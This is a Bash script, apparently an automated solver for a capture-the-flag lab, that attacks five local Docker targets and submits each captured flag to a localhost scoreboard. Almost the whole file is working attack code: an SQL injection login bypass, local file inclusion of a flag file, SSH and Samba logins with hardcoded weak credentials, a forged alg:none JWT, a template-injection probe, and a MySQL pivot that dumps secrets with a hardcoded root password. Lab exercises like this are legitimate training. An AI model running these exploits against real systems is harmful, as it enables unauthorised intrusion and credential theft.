#!/bin/bash
# ============================================
# 🏴 OZZ — Full Attack Chain
# Captura todas as 5 flags e submete no scoreboard
# ============================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SCOREBOARD="http://localhost:9090"
AGENT="Ozz"
FLAGS_FOUND=0
TOTAL_FLAGS=5

echo -e "${GREEN}${BOLD}"
echo "  ╔══════════════════════════════════════════════╗"
echo "  ║  🏴 OZZ — FULL ATTACK CHAIN                  ║"
echo "  ║  Capturing all 5 flags                       ║"
echo "  ╚══════════════════════════════════════════════╝"
echo -e "${NC}"

submit_flag() {
    local flag="$1"
    local source="$2"
    echo -e "  ${GREEN}🚩 FLAG: ${flag}${NC}"
    echo -e "  ${CYAN}📤 Submitting to scoreboard...${NC}"
    RESP=$(curl -s -X POST "${SCOREBOARD}/submit" \
        --data-urlencode "flag=${flag}" \
        --data-urlencode "agent=${AGENT}" 2>/dev/null)
    echo -e "  ${GREEN}✅ Submitted${NC}"
    FLAGS_FOUND=$((FLAGS_FOUND + 1))
    echo ""
}

# ============================================================
# TARGET-01: Web (SQLi + LFI)
# ============================================================
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}${BOLD}  TARGET-01: Web Server (10.0.0.10)${NC}"
echo -e "${YELLOW}${BOLD}  Vulns: SQLi, LFI${NC}"
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${CYAN}[1/4] SQLi — Login bypass as admin...${NC}"
LOGIN=$(curl -s -X POST 'http://localhost:8081/?page=login' \
    -d "username=admin'--&password=anything" 2>/dev/null)
if echo "$LOGIN" | grep -qi "welcome\|admin"; then
    echo -e "  ${GREEN}✅ SQLi successful — logged in as admin${NC}"
else
    echo -e "  ${YELLOW}⚠️  Response: $(echo "$LOGIN" | head -1 | cut -c1-80)${NC}"
fi

echo -e "${CYAN}[2/4] Extracting secrets from admin dashboard...${NC}"
SECRETS=$(curl -s 'http://localhost:8081/?page=dashboard&action=view_secrets' 2>/dev/null)
echo -e "  ${GREEN}📋 Secrets found:${NC}"
echo "$SECRETS" | grep -oP '(db_password|ssh_key)[^<]*' | head -5

echo -e "${CYAN}[3/4] LFI — Reading flag file...${NC}"
FLAG1=$(curl -s 'http://localhost:8081/?page=reports&file=/var/secret/flag.txt' 2>/dev/null)
FLAG1_CLEAN=$(echo "$FLAG1" | grep -oP 'flag\{[^}]+\}' | head -1)

if [ -n "$FLAG1_CLEAN" ]; then
    submit_flag "$FLAG1_CLEAN" "TARGET-01 LFI"
else
    echo -e "  ${RED}❌ Flag not found in response${NC}"
    echo -e "  ${YELLOW}Raw: $(echo "$FLAG1" | head -3)${NC}"
fi

echo -e "${CYAN}[4/4] Checking debug page for more info...${NC}"
DEBUG=$(curl -s 'http://localhost:8081/?page=debug' 2>/dev/null)
echo "$DEBUG" | grep -oP 'DB_PASSWORD=[^<]*' | head -1
echo ""

# ============================================================
# TARGET-02: SSH + Samba (Weak Credentials)
# ============================================================
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}${BOLD}  TARGET-02: SSH + Samba (10.0.0.20)${NC}"
echo -e "${YELLOW}${BOLD}  Vulns: Weak creds, Samba share${NC}"
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${CYAN}[1/3] SSH — Trying admin:password123...${NC}"
# Use SSH to grab flag and config
SSH_FLAG=$(sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 -p 2222 admin@localhost \
    'cat /home/admin/flag.txt 2>/dev/null' 2>/dev/null)

if [ -n "$SSH_FLAG" ]; then
    FLAG2_CLEAN=$(echo "$SSH_FLAG" | grep -oP 'flag\{[^}]+\}' | head -1)
    if [ -n "$FLAG2_CLEAN" ]; then
        submit_flag "$FLAG2_CLEAN" "TARGET-02 SSH"
    fi
else
    echo -e "  ${YELLOW}⚠️  SSH not available or creds failed. Trying Samba...${NC}"
fi

echo -e "${CYAN}[2/3] Samba — Accessing admin share...${NC}"
SMB_CREDS=$(smbclient //localhost/admin -U admin%password123 -p 4455 \
    -c 'get creds.txt /tmp/smb_creds.txt' 2>/dev/null && cat /tmp/smb_creds.txt 2>/dev/null)
if [ -n "$SMB_CREDS" ]; then
    echo -e "  ${GREEN}📋 Samba credentials:${NC}"
    echo "$SMB_CREDS"
fi

echo -e "${CYAN}[3/3] Reading config.ini via SSH...${NC}"
CONFIG=$(sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 -p 2222 admin@localhost \
    'cat /opt/config.ini 2>/dev/null' 2>/dev/null)
if [ -n "$CONFIG" ]; then
    echo -e "  ${GREEN}📋 Config found:${NC}"
    echo "$CONFIG" | grep -E '(host|user|password)' | head -5
fi
echo ""

# ============================================================
# TARGET-03: Flask API (SSTI + JWT Bypass)
# ============================================================
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}${BOLD}  TARGET-03: Flask API (10.0.0.30)${NC}"
echo -e "${YELLOW}${BOLD}  Vulns: SSTI, JWT algorithm confusion${NC}"
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${CYAN}[1/5] API discovery...${NC}"
API_ROOT=$(curl -s http://localhost:5000/ 2>/dev/null)
echo "$API_ROOT" | python3 -c "import sys,json; d=json.load(sys.stdin); print('  Endpoints:', list(d.get('endpoints',{}).keys()))" 2>/dev/null || echo "  (raw response received)"

echo -e "${CYAN}[2/5] Login with default creds (admin/admin2026)...${NC}"
TOKEN_RESP=$(curl -s -X POST http://localhost:5000/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":"admin2026"}' 2>/dev/null)
TOKEN=$(echo "$TOKEN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
if [ -n "$TOKEN" ]; then
    echo -e "  ${GREEN}✅ Got JWT token: ${TOKEN:0:30}...${NC}"
else
    echo -e "  ${RED}❌ Login failed${NC}"
fi

echo -e "${CYAN}[3/5] JWT bypass — forging admin token with alg:none...${NC}"
NONE_TOKEN=$(python3 -c "
import json, base64
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
" 2>/dev/null)
echo -e "  ${GREEN}🔑 Forged token: ${NONE_TOKEN:0:30}...${NC}"

echo -e "${CYAN}[4/5] Accessing /admin/secrets with forged token...${NC}"
SECRETS3=$(curl -s http://localhost:5000/admin/secrets \
    -H "Authorization: Bearer ${NONE_TOKEN}" 2>/dev/null)
FLAG3_CLEAN=$(echo "$SECRETS3" | grep -oP 'flag\{[^}]+\}' | head -1)
if [ -n "$FLAG3_CLEAN" ]; then
    submit_flag "$FLAG3_CLEAN" "TARGET-03 JWT Bypass"
else
    echo -e "  ${YELLOW}Trying with original token...${NC}"
    SECRETS3B=$(curl -s http://localhost:5000/admin/secrets \
        -H "Authorization: Bearer ${TOKEN}" 2>/dev/null)
    FLAG3B=$(echo "$SECRETS3B" | grep -oP 'flag\{[^}]+\}' | head -1)
    if [ -n "$FLAG3B" ]; then
        submit_flag "$FLAG3B" "TARGET-03 JWT Token"
    fi
fi

echo -e "${CYAN}[5/5] SSTI — Testing template injection...${NC}"
SSTI=$(curl -s -X POST http://localhost:5000/render \
    -H 'Content-Type: application/json' \
    -d '{"template":"{{7*7}}","name":"test"}' 2>/dev/null)
echo "$SSTI" | grep -oP '\d+' | head -1 | xargs -I{} echo -e "  ${GREEN}✅ SSTI confirmed: 7*7 = {}${NC}"
echo ""

# ============================================================
# TARGET-04: MySQL Internal (Credential Chain)
# ============================================================
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}${BOLD}  TARGET-04: MySQL Internal (10.0.0.40)${NC}"
echo -e "${YELLOW}${BOLD}  Vulns: Credential chain from all targets${NC}"
echo -e "${YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${CYAN}[1/2] Connecting to MySQL with gathered credentials...${NC}"
# We need to connect from within the Docker network
# Use docker exec to run mysql from target-01 or target-02
MYSQL_RESULT=$(docker exec target-02 mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' \
    -e 'USE corporate; SELECT secret_key, secret_value FROM internal_secrets;' 2>/dev/null || \
    docker exec target-01 mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' \
    -e 'USE corporate; SELECT secret_key, secret_value FROM internal_secrets;' 2>/dev/null || \
    echo "MySQL client not available in containers")

if echo "$MYSQL_RESULT" | grep -q "flag"; then
    echo -e "  ${GREEN}📋 Database dump:${NC}"
    echo "$MYSQL_RESULT" | grep -E "flag|secret" | head -10

    FLAG4_CLEAN=$(echo "$MYSQL_RESULT" | grep -oP 'flag\{deep_vault[^}]+\}' | head -1)
    FLAG5_CLEAN=$(echo "$MYSQL_RESULT" | grep -oP 'flag\{halctf[^}]+\}' | head -1)

    if [ -n "$FLAG4_CLEAN" ]; then
        submit_flag "$FLAG4_CLEAN" "TARGET-04 MySQL"
    fi
    if [ -n "$FLAG5_CLEAN" ]; then
        submit_flag "$FLAG5_CLEAN" "TARGET-04 MySQL"
    fi
else
    echo -e "  ${YELLOW}⚠️  Direct MySQL not available. Trying via SSH tunnel...${NC}"
    # Alternative: use SSH to target-02, then mysql from there
    MYSQL_ALT=$(sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 -p 2222 admin@localhost \
        "mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' -e 'USE corporate; SELECT secret_key, secret_value FROM internal_secrets;' 2>/dev/null" 2>/dev/null)
    if echo "$MYSQL_ALT" | grep -q "flag"; then
        echo "$MYSQL_ALT" | grep -E "flag|secret" | head -10
        FLAG4_CLEAN=$(echo "$MYSQL_ALT" | grep -oP 'flag\{deep_vault[^}]+\}' | head -1)
        FLAG5_CLEAN=$(echo "$MYSQL_ALT" | grep -oP 'flag\{halctf[^}]+\}' | head -1)
        [ -n "$FLAG4_CLEAN" ] && submit_flag "$FLAG4_CLEAN" "TARGET-04 MySQL via SSH"
        [ -n "$FLAG5_CLEAN" ] && submit_flag "$FLAG5_CLEAN" "TARGET-04 MySQL via SSH"
    else
        echo -e "  ${RED}❌ Could not reach MySQL. Manual pivot required.${NC}"
    fi
fi

# ============================================================
# FINAL REPORT
# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║  🏴 OZZ — ATTACK COMPLETE                    ║${NC}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BOLD}Flags found: ${FLAGS_FOUND}/${TOTAL_FLAGS}${NC}"
echo ""
echo -e "  ${CYAN}📊 Check scoreboard: http://localhost:9090${NC}"
echo ""
